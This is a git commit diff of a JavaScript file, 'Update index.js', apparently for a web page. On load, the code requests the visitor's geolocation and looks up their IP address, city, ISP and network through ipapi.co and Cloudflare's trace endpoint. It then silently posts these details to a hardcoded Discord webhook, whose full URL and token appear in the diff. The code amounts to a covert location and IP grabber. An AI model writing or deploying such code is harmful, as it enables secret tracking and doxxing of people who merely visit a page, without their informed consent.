4dee84e7eb1ae1b88cbe944f9aa341cf303125d2
CitizenFoffie <40131823+CitizenFoffie@users.noreply.github.com>
2023-05-10 18:55:39 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,30 @@
-console.log("HI")
+var x = document.getElementById("demo");
+var anew
 function text(url) {
   console.log(url)
   return fetch(url).then(res => res.text());
 }
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+spc = " "
+var anew
+function showPosition(position) {
+  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
+  let ip = data.match(ipRegex)[0];
+  console.log(ip);
+  anew = position.coords.longitude+spc+position.coords.latitude+spc
+  console.log(anew);
+});
+  console.log(position)
+}
+
+getLocation()
 function sendMessage(msg) {
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
@@ -16,24 +38,20 @@ function sendMessage(msg) {
 
   request.send(JSON.stringify(params));
 }
-
-var x = document.getElementById("demo");
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else {
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-spc = " "
-function showPosition(position) {
-  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
-  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
-  let ip = data.match(ipRegex)[0];
-  console.log(ip);
-  sendMessage(ip+spc+position.coords.longitude+spc+position.coords.latitude+spc);
-});
-  console.log(position)
-}
-
-getLocation()
+fetch('https://ipapi.co/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    console.log(data);
+  });
+// 2 - XMLHttpRequest : Older method
+var req = new XMLHttpRequest();
+var ipr;
+req.overrideMimeType("application/json");
+req.open('GET', 'https://ipapi.co/json/', true);
+req.onload  = function() {
+  ipr = JSON.parse(req.responseText);
+  sendMessage(ipr.ip+spc+ipr.city+spc+ipr.org+spc+ipr.network+spc+anew)
+};
+req.send(null);
